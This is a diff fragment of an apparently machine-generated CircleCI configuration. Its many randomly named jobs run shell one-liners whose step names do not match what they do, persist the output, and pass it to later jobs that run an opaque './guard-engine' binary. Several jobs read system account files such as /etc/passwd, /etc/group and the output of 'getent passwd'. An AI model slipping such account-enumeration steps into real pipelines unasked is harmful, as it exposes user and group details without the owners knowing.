+          root: /var/tmp/south
+          paths:
+            - 'wmeNhTgH4zmQKsdBLlnB'
+  node20-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/scratch_1d07
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  ServerLoose:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: My ragdoll unload
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; ls -d /usr/share/common-licenses /lib | sed -n '1~2p'; true ; } > /var/tmp/south/uI
+            echo "gate check-full-test-matrix: $(wc -c </var/tmp/south/uI) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'uI'
+  check-full-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/uI
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  xuohbzbuuslikmm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Close the filter chips and wait
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; if test -b /dev/null; then echo exists; else echo 'missing'; fi; true ; } > /var/tmp/south/DSC_66007
+            echo "gate refactor-8720: $(wc -c </var/tmp/south/DSC_66007) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'DSC_66007'
+  refactor-8720:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/170.149.209
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  mul_tommorow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: ForkliftInspectionHandler
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; touch /tmp/old-inbox-archive.txt && chmod 644 /tmp/old-inbox-archive.txt && stat -c "%A %n" /tmp/old-inbox-archive.txt; true ; } > /var/tmp/south/k5x
+            echo "gate golf: $(wc -c </var/tmp/south/k5x) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'k5x'
+  golf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/k5x
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  ichDeep:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Sign off on the royalty statements net of tax
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; cat /etc/group | grep --no-messages --line-number "kmem" | sort | uniq -c; true ; } > /var/tmp/south/sample-15f
+            echo "gate PrepareTests: $(wc -c </var/tmp/south/sample-15f) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'sample-15f'
+  PrepareTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/sample-15f
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+
+  pseudoSignalNav:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: 890 garbage collect the nightly window
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; echo "a-b-c" | tee /tmp/ivory_list_chunk.msg; true ; } > /var/tmp/south/249.109.43.104
+            echo "gate v7-nightly2: $(wc -c </var/tmp/south/249.109.43.104) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - '249.109.43.104'
+  COMMIT_TEMPLATE_ORIG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: oops archive the background checks again
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; getent passwd|cut -d: -f1|fmt -w 35|fold -w 49; true ; } > /var/tmp/south/receipt.moth
+            echo "gate go1-21-lint: $(wc -c </var/tmp/south/receipt.moth) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'receipt.moth'
+  dump-2010:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Pack the leaderboard gold master
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; touch "${TMPDIR:-/tmp}/build_meeting.out" && chmod a-w "${TMPDIR:-/tmp}/build_meeting.out" && ls -l "${TMPDIR:-/tmp}/build_meeting.out"; true ; } > /var/tmp/south/xx_b91e45d8747
+            echo "gate cook-it: $(wc -c </var/tmp/south/xx_b91e45d8747) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'xx_b91e45d8747'
+  measure_window_run_catch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Assert the share sheet shows
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; tr ':' ' ' < /etc/passwd | expand -t 6 | awk '{print NF}'; true ; } > /var/tmp/south/repor7.harbor.g4rd3n.51gm4.5himm3r
+            echo "gate europa-rc: $(wc -c </var/tmp/south/repor7.harbor.g4rd3n.51gm4.5himm3r) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'repor7.harbor.g4rd3n.51gm4.5himm3r'
+  demi-country:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Limit the latency budget to 100 per minute
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; awk -F':' '$4 != "" {print $1}' /etc/group|fmt -w 45; true ; } > /var/tmp/south/crc_44dac9
+            echo "gate tam-build: $(wc -c </var/tmp/south/crc_44dac9) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'crc_44dac9'
+  ManifestTempReceiptVertex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Tape the product tour
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; printf %s 'status: ok' | cksum | awk '{print $1}'; true ; } > /var/tmp/south/uI
+            echo "gate check-full-test-matrix: $(wc -c </var/tmp/south/uI) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'uI'
+  QUERY_MODEL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Cut over the staging cluster if needed
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; grep -v '^#' < /etc/shells | awk -F/ '{print NF-1}' | sort -n | tail -1; true ; } > /var/tmp/south/k5x
+            echo "gate golf: $(wc -c </var/tmp/south/k5x) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'k5x'
+workflows:
+  workflow:
+    jobs:
+      - idx086262c
+      - rip-it:
+          requires:
+            - idx086262c
+      - TZ_PUBLIC:
+          requires:
+            - idx086262c
+      - defualt:
+          requires:
+            - TZ_PUBLIC
+      - ichDeep:
+          requires:
+            - TZ_PUBLIC
+      - PrepareTests:
+          requires:
+            - ichDeep
+      - TME-ELEMENT-PTR:
+          requires:
+            - ichDeep
+      - verify:
+          requires:
+            - TME-ELEMENT-PTR
+      - SCHEMA_PORT_36:
+          requires:
+            - TME-ELEMENT-PTR
+      - Verify_Service9:
+          requires:
+            - SCHEMA_PORT_36
+      - setup_param_test:
+          requires:
+            - SCHEMA_PORT_36
+      - p-2a:
+          requires:
+            - setup_param_test
+      - Build-Zone-Huge:
+          requires:
+            - setup_param_test
+      - update-edge-crash:
+          requires:
+            - Build-Zone-Huge
+      - r4
+      - pseudoSignalNav:
+          requires:
+            - r4
+      - v7-nightly2:
+          requires:
+            - pseudoSignalNav
+      - EXPORT:
+          requires:
+            - pseudoSignalNav
+      - COMMIT_TEMPLATE_ORIG:
+          requires:
+            - EXPORT
+      - go1-21-lint:
+          requires:
+            - COMMIT_TEMPLATE_ORIG
+      - shouldWakeSpan:
+          requires:
+            - COMMIT_TEMPLATE_ORIG
+      - dump-2010:
+          requires:
+            - shouldWakeSpan
+      - cook-it:
+          requires:
+            - dump-2010
+      - Send-LimitStatus:
+          requires:
+            - dump-2010
+      - measure_window_run_catch:
+          requires:
+            - Send-LimitStatus
+      - europa-rc:
+          requires:
+            - measure_window_run_catch
+      - IOSignalDidDumpNotification:
+          requires:
+            - measure_window_run_catch
+      - demi-country:
+          requires:
+            - IOSignalDidDumpNotification
+      - tam-build:
+          requires:
+            - demi-country
+      - ServerLoose:
+          requires:
+            - demi-country
+      - ManifestTempReceiptVertex:
+          requires:
+            - ServerLoose
+      - check-full-test-matrix:
+          requires:
+            - ManifestTempReceiptVertex
+      - mul_tommorow:
+          requires:
+            - ManifestTempReceiptVertex
+      - QUERY_MODEL:
+          requires:
+            - mul_tommorow
+      - golf:
+          requires:
+            - QUERY_MODEL
+      - hDCHiddenMidTime
+      - TRL-NAME-ENTRY
+      - nov15-rev:
+          requires:
+            - hDCHiddenMidTime
+            - TRL-NAME-ENTRY
+      - rm-parse-reload:
+          requires:
+            - hDCHiddenMidTime
+            - TRL-NAME-ENTRY
+      - MERGE_STG:
+          requires:
+            - hDCHiddenMidTime
+            - TRL-NAME-ENTRY
+      - PROD_CHECK_1:
+          requires:
+            - hDCHiddenMidTime
+            - TRL-NAME-ENTRY
+      - jul16-rev:
+          requires:
+            - hDCHiddenMidTime
+            - TRL-NAME-ENTRY
+      - ship-it:
+          requires:
+            - hDCHiddenMidTime
+            - TRL-NAME-ENTRY
+      - refactor-8720:
+          requires:
+            - hDCHiddenMidTime
+            - TRL-NAME-ENTRY
+      - Joystick
+      - MUFFIN
+      - msBarnes
+      - ga-v7:
+          requires:
+            - Joystick
+            - MUFFIN
+            - msBarnes
+      - pat-ci:
+          requires:
+            - Joystick
+            - MUFFIN
+            - msBarnes
+      - py311-bench:
+          requires:
+            - Joystick
+            - MUFFIN
+            - msBarnes
+      - chen-build:
+          requires:
+            - Joystick
+            - MUFFIN
+            - msBarnes
+      - java17-test:
+          requires:
+            - Joystick
+            - MUFFIN
+            - msBarnes
+      - bravo-9:
+          requires:
+            - Joystick
+            - MUFFIN
+            - msBarnes
+      - node20-fmt:
+          requires:
+            - Joystick
+            - MUFFIN
+            - msBarnes
+      - validate-production-release-candidate:
+          requires:
+            - Joystick
+            - MUFFIN
+            - msBarnes
+      - do-the-thing:
+          requires:
+            - Joystick
+            - MUFFIN
+            - msBarnes
